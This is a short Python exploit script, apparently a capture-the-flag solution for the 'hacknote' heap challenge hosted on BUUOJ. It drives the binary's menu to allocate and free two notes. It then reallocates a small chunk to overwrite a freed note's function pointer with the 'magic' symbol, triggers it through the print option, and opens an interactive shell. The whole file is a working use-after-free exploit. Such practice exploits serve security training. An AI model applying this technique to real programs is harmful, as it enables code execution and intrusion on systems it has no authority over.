import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=True,
    file='./hacknote',
    remote='node4.buuoj.cn:28737',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf


def fadd(size: int, content: bytes):
    sla(b'Your choice :', b'1')
    sla(b' size :', str(size))
    sla(b'Content :', content)
def fdelete(index: int):
    sla(b'Your choice :', b'2')
    sla(b'Index :', str(index))
def fprint(index: int):
    sla(b'Your choice :', b'3')
    sla(b'Index :', str(index))
def fexit():
    sla(b'Your choice :', b'4')
pause()
fadd(0x10, 'a1')  # index0
fadd(0x10, 'a2')  # index1
fdelete(0)
fdelete(1)
fadd(0x8, p00(elf.symbols['magic'])) 
fprint(0)
interactive()
